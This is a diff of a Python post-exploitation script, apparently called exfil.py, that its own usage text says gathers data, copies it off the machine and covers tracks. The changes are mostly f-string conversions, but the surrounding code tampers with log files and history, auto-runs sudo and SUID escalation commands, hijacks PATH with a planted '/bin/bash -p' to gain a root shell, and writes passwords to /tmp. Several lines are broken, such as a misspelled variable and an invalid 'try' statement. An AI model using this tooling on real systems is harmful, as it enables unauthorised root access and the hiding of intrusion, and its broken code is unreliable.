@@ -14,14 +14,14 @@ import re
 
 
 parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i 10.0.0.1:/home/data.txt -p 'password123'")
-parser.add_argument("-p", "--password", help="specify user's password if know", action="store_true")
+parser.add_argument("-p", "--password", help="specify user's password if know")
 args = parser.parse_args()
 password = args.password
 
 
 # check to see if user needs password to run sudo
 sudo_time = os.system("time timeout -k 5 5 sudo -l")
-sudo_no_pass = 
+sudo_no_pass = None
 if sudo_time > float('1.0'):
 	sudo_no_pass = False
 else:
@@ -34,8 +34,8 @@ os.system("touch /tmp/pwd.txt")
 
 # disable history logging and create backups
 def disable_hist():
-	print("\n### creating backups of log files... ###")
-	os.system("mkdir /tmp/.backups")
+    print("\n### creating backups of log files... ###")
+    os.system("mkdir /tmp/.backups")
     os.system("cp /var/log/auth.log /tmp/.backups/")
     os.system("cp /var/log/cron.log /tmp/.backups/")
     os.system("cp /var/log/maillog /tmp/.backups/")
@@ -98,14 +98,14 @@ def sudo_l():
     # loop through dictionaries and print cmds if need user interaction, otherwise execute
     for key,value in sudo_bins_print:
         if key in last_line:
-            print(f"{key}: {value}")
+            print("{}: {}".format(key,value))
             continue
         else:
             continue
 
     for key,value in sudo_bins_exec:
         if key in last_line:
-            print(f"{key}: {value}")
+            print("{}: {}".format(key,value))
             sudo_cmd = value.strip()
             os.system(sudo_cmd)
         else:
@@ -163,7 +163,7 @@ def suid():
                 continue
         for key,value in suid_bins:
             if key in suid:
-                print(f"\n{key}: {value}")
+                print("\n{}: {}".format(key,value))
                 suid_cmd = value.strip()
                 os.system(suid_cmd)
                 break
@@ -186,15 +186,15 @@ def path():
         lines = root_files.readlines()
         for line in lines:
             split_path = line.split("/")
-            os.system(f"strings {line} > /tmp/.path/root_{split_path[-1]}")
+            os.system("strings {} > /tmp/.path/root_{}".format(line,plit_path[-1]))
             print("\n### running strings on SUID executables & searching for cmds w/o fill path (might want to check manually as well)")
             strings_file = open(f"/tmp/.path/root_{split_path[-1]}")
             lines_strings = strings_file.readlines()
             for cmd in common_cmds:
                 non_path_cmd = re.search(f"\\s{cmd}\\s", lines_strings)
                 if non_path_cmd:
-                    print(f"\n### {line} does not specify full path of {cmd} ###")
-                    os.system(f"touch /tmp/{cmd}&&echo '/bin/bash -p' > /tmp/{cmd}&&chmod +x /tmp/{cmd}&&export PATH=/tmp:$PATH&&.{line}")
+                    print("\n### {} does not specify full path of {} ###".format(line,cmd))
+                    os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
                     break
                 else:
                     continue
@@ -263,7 +263,7 @@ disable_hist()
 
 try args.password:
     print("\n### running sudo -l: ###")
-    os.system(f"timeout -k 3 3 sudo -l -S {password} | tee /tmp/pwd.txt")
+    os.system("timeout -k 3 3 sudo -l -S {} | tee /tmp/pwd.txt".format(password))
     #os.system("sudo -S < <(echo '{password}') <command>")
 except:
     print("\n*** error: couldn't run sudo -l, try running it manually ***")
